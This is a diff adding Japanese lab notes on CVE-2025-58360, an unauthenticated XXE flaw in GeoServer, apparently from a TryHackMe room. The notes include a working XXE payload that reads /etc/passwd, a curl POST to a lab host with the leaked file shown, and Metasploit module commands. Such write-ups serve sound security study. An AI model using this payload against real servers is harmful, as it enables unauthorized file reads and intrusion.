@@ -1,5 +1,48 @@
 # CVE
 
+## CVE-2025-58360 (GeoServer XXE)
+
+https://tryhackme.com/room/geoservercve202558360
+
+- 政府機関や民間組織が地理空間データの公開と管理に広く利用しているプラットフォーム。
+- XXE。認証不要で任意のファイル読み取り。SSRFにつながる。
+- `2.25.6より前`のバージョン、および`2.26.0`と`2.26.1`に影響。
+
+geoserver.xml
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<StyledLayerDescriptor version="1.0.0">
+<NamedLayer>
+<Name>&xxe;</Name>
+</NamedLayer>
+</StyledLayerDescriptor>
+```
+
+不正なXMLをGetMapに対してPOSTする。`Unknown layer: `エラーの後にファイル内容が表示される。
+
+```sh
+$ curl -X POST "http://10.49.170.163:8080/geoserver/wms?REQUEST=GetMap&SERVICE=WMS" -H "Content-Type: application/xml" -d @geoserver.xml
+
+<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE ServiceExceptionReport SYSTEM "http://10.49.170.163:8080/geoserver/schemas/wms/1.1.1/WMS_exception_1_1_1.dtd"> <ServiceExceptionReport version="1.1.1" >   <ServiceException>
+      Unknown layer: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+```
+
+metasploitモジュールも作られている。
+
+```sh
+msf6 > use auxiliary/gather/geoserver_wms_getmap_xxe_file_read
+msf6 > set RHOSTS 10.49.170.163
+msf6 > set RPORT 8080
+msf6 > exploit
+```
+
+
 ## CVE-2025-55182 (React2Shell)
 
 https://tryhackme.com/room/react2shellcve202555182
